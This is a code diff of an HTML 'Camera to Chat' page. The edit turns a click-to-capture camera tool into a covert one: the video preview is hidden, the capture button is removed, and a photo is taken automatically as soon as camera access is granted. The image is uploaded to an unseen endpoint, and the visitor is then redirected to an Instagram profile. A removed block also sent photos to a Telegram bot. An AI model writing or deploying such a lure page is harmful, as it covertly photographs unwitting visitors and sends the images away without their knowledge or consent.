@@ -5,59 +5,38 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Camera to Chat</title>
   <style>
-    .camera-link {
-      color: blue;
-      text-decoration: underline;
-      cursor: pointer;
-    }
-    #camera-input {
-      display: none;
-    }
     #video {
-      width: 100%;
-      height: auto;
-      border: 1px solid black;
-    }
-    #capture-btn {
-      display: block;
-      margin-top: 10px;
-      background-color: blue;
-      color: white;
-      padding: 10px;
-      cursor: pointer;
+      display: none; /* Hide video element, we just need it for capturing the photo */
     }
   </style>
 </head>
 <body>
   <h1>Camera to Chat</h1>
   <video id="video" autoplay></video>
-  <button id="capture-btn">Capture Photo</button>
 
-  <input 
-    type="file" 
-    accept="image/*" 
-    capture="user" 
-    id="camera-input"
-    style="display:none;" 
-    onchange="handlePhoto(event)">
-    
   <script>
+    // Function to start the camera
     async function startCamera() {
       try {
+        // Request camera permission
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById("video");
         video.srcObject = stream;
+        
+        // Once the camera stream is active, capture the photo
+        capturePhoto();
       } catch (error) {
         console.error("Error accessing the camera:", error);
         alert("Unable to access the camera. Please check your device settings.");
       }
     }
 
+    // Function to capture photo
     function capturePhoto() {
       const video = document.getElementById("video");
       const canvas = document.createElement("canvas");
       const context = canvas.getContext("2d");
-      
+
       // Set canvas dimensions to match the video
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -81,17 +60,6 @@
             body: formData,
           });
 
-          // Send to Telegram Bot
-          const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
-          const telegramChatId = "YOUR_CHAT_ID";
-          const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
-
-          formData.append("chat_id", telegramChatId);
-          await fetch(telegramUrl, {
-            method: "POST",
-            body: formData,
-          });
-
           // Redirect after success
           alert("Photo sent successfully!");
           window.location.href = "https://www.instagram.com/f_arsenova/";
@@ -103,10 +71,8 @@
       }, "image/jpeg");
     }
 
-    document.getElementById("capture-btn").addEventListener("click", capturePhoto);
-
     // Start the camera when the page loads
-    startCamera();
+    window.onload = startCamera;
   </script>
 </body>
 </html>
